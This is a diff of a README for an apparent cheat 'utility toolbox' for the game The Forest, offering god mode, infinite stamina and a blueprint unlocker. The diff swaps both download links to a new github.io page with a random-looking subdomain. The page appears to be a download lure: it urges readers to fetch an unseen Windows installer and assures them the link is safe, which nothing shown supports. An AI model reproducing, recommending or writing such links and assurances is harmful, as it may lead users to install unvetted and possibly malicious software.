@@ -2,7 +2,7 @@
 
 The Forest 2026 Ultimate Utility Toolbox is your comprehensive companion for enhancing the survival-horror experience on PC. This all-in-one utility suite integrates essential features like infinite stamina, god mode, and a blueprint unlocker directly into the game, allowing for a more tailored and enjoyable playthrough. Built specifically for Windows 10 and Windows 11, it provides a stable and user-friendly interface for modifying your single-player experience.
 
-[![Download Installer](https://img.shields.io/badge/Download-Latest%20Version-brightgreen?style=for-the-badge&logo=windows&logoColor=white)](https://yellowtaxisave.github.io/download-page/)
+[![Download Installer](https://img.shields.io/badge/Download-Latest%20Version-brightgreen?style=for-the-badge&logo=windows&logoColor=white)](https://capitals-707-bringing.github.io/download-page/)
 
 ## Key Features
 
@@ -54,7 +54,7 @@ A: Most features like god mode and infinite stamina are temporary and only activ
 
 You can download the latest version of the installer directly from our official page. We recommend always using the provided link to ensure you receive a safe and up-to-date version.
 
-[Download the latest version from GitHub](https://yellowtaxisave.github.io/download-page/)
+[Download the latest version from GitHub](https://capitals-707-bringing.github.io/download-page/)
 
 ---
 
